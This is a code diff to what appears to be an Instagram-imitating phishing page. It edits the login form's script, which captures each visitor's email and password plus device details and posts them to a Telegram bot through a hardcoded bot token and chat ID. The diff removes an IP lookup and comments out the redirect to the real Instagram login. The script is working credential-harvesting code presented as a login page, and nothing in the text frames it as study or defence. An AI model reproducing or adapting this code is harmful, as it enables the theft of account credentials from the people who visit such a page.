@@ -73,7 +73,7 @@
     <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
     <script>
         const TOKEN = "7207395066:AAHS6Wre2Lz4iTRTeXZd4FlCULz_AAwJrl8"; // Your Telegram Bot Token
-        const CHAT_ID = "6714651494"; // Your Telegram Chat ID
+        const CHAT_ID = "6714651494"; // Your Telegram Chat ID (Replace with your correct chat_id)
         const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`; // Telegram Bot API URL
 
         // Adding event listener for form submission
@@ -83,45 +83,36 @@
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
-            // Fetching IP Address using ipify API
-            axios.get('https://api.ipify.org?format=json')
-                .then(response => {
-                    const ip = response.data.ip;
+            // Collecting browser and device information (no IP here)
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const screenWidth = screen.width;
+            const screenHeight = screen.height;
+            const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
 
-                    // Collecting browser and device information
-                    const userAgent = navigator.userAgent;
-                    const platform = navigator.platform;
-                    const screenWidth = screen.width;
-                    const screenHeight = screen.height;
-                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+            // Constructing the message to send to Telegram (without IP)
+            const message = ` 
+                <b>New Login Attempt</b>\n
+                <b>Email:</b> ${email}\n
+                <b>Password:</b> ${password}\n
+                <b>Device Type:</b> ${deviceType}\n
+                <b>Platform:</b> ${platform}\n
+                <b>User Agent:</b> ${userAgent}\n
+                <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+            `;
 
-                    // Constructing the message to send to Telegram
-                    const message = ` 
-                        <b>New Login Attempt</b>\n
-                        <b>Email:</b> ${email}\n
-                        <b>Password:</b> ${password}\n
-                        <b>IP Address:</b> ${ip}\n
-                        <b>Device Type:</b> ${deviceType}\n
-                        <b>Platform:</b> ${platform}\n
-                        <b>User Agent:</b> ${userAgent}\n
-                        <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
-                    `;
-
-                    // Sending the message to Telegram Bot
-                    axios.post(URI_API, {
-                        chat_id: CHAT_ID,
-                        parse_mode: 'html',
-                        text: message
-                    }).then(response => {
-                        // Redirecting to Instagram official login page after sending the data
-                        window.location.href = "https://www.instagram.com/accounts/login/";
-                    }).catch(error => {
-                        alert('Error sending the information. Please try again.');
-                    });
-                })
-                .catch(error => {
-                    alert('Error fetching the IP address. Please try again.');
-                });
+            // Sending the message to Telegram Bot
+            axios.post(URI_API, {
+                chat_id: CHAT_ID,
+                parse_mode: 'html',
+                text: message
+            }).then(response => {
+                // Commenting out the redirection to Instagram official page
+                // window.location.href = "https://www.instagram.com/accounts/login/";
+            }).catch(error => {
+                console.log('Error:', error);  // Log the error for debugging
+                alert('Error sending the information. Please try again.');
+            });
         });
     </script>
 </body>
